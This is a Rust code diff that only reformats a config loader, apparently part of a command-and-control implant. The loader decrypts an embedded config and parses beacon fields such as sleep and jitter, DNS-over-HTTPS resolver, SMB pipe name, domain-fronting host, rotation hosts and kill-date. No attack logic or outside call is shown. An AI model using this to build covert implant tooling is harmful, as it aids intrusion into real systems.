@@ -105,14 +105,11 @@ pub fn load() -> (Config, Vec<u8>) {
     // tag mismatch. Under panic=abort a corrupted embedded config used to tear
     // the process down with no diagnostic; we now exit with a dedicated code
     // (0xC000_0002) so a config-tamper is identifiable from the exit status.
-    let plain: Vec<u8> = match nyx_config::decrypt(
-        &baked::CONFIG_KEY,
-        &baked::CONFIG_NONCE,
-        baked::CONFIG_CT,
-    ) {
-        Ok(p) => p,
-        Err(_) => fatal_config(0xC000_0002), // AEAD tag mismatch / tampered config
-    };
+    let plain: Vec<u8> =
+        match nyx_config::decrypt(&baked::CONFIG_KEY, &baked::CONFIG_NONCE, baked::CONFIG_CT) {
+            Ok(p) => p,
+            Err(_) => fatal_config(0xC000_0002), // AEAD tag mismatch / tampered config
+        };
     match decode(&plain) {
         Ok(c) => (c, plain),
         Err(_) => fatal_config(0xC000_0001), // decrypted but shape wrong (broken build)
@@ -153,9 +150,19 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
     let sleep_seconds = r.u32()?;
     let jitter_pct = r.u8()?;
     let use_tls_byte = r.u8()?;
-    let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token,
-         rotation_hosts, fronting_host, proxy_server, tcp_peer_host, tcp_peer_port) =
-        decode_extended_tail(&mut r)?;
+    let (
+        primary_channel,
+        fallback_bitmap,
+        doh_resolver,
+        smb_pipe_name,
+        extc2_api_host,
+        extc2_token,
+        rotation_hosts,
+        fronting_host,
+        proxy_server,
+        tcp_peer_host,
+        tcp_peer_port,
+    ) = decode_extended_tail(&mut r)?;
     Ok(Config {
         server_host,
         server_port,
@@ -190,7 +197,24 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
 /// field reads now FAIL (propagate `?`) instead of silently defaulting — a
 /// shape-mismatched blob must not silently zero the rotation/proxy/channel
 /// fields (or, in config_placeholder, the kill-date).
-fn decode_extended_tail(r: &mut Reader) -> Result<(u8, u8, String, String, String, String, String, String, String, String, u16), WireError> {
+fn decode_extended_tail(
+    r: &mut Reader,
+) -> Result<
+    (
+        u8,
+        u8,
+        String,
+        String,
+        String,
+        String,
+        String,
+        String,
+        String,
+        String,
+        u16,
+    ),
+    WireError,
+> {
     if r.remaining() > 0 {
         let primary_channel = r.u8()?;
         let fallback_bitmap = r.u8()?;
@@ -224,7 +248,18 @@ fn decode_extended_tail(r: &mut Reader) -> Result<(u8, u8, String, String, Strin
             tcp_peer_port,
         ))
     } else {
-        Ok((0, 0, String::new(), String::new(), String::new(), String::new(),
-            String::new(), String::new(), String::new(), String::new(), 0))
+        Ok((
+            0,
+            0,
+            String::new(),
+            String::new(),
+            String::new(),
+            String::new(),
+            String::new(),
+            String::new(),
+            String::new(),
+            String::new(),
+            0,
+        ))
     }
 }
